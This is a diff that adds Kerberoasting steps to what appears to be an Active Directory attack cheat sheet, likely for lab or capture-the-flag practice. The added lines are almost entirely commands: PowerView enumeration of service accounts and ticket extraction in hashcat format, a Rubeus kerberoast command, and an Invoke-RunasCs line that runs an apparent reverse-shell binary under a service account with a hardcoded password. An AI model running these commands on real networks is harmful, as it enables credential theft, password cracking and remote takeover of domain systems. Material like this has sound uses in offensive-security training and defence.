@@ -65,6 +65,24 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr
 ```
 
 
+### without pass kerberoast powerview
+
+```
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
+```
+
+rubeus will give proper hash which will not need formatting
+
+```
+.\Rubeus.exe kerberoast /nowrap
+```
+
+use `Invoke-RunasCS.ps1` with user & pass
+
+```
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "reverse.exe"
+```
 ## DCsync
 
 DC are synced to reduce availability
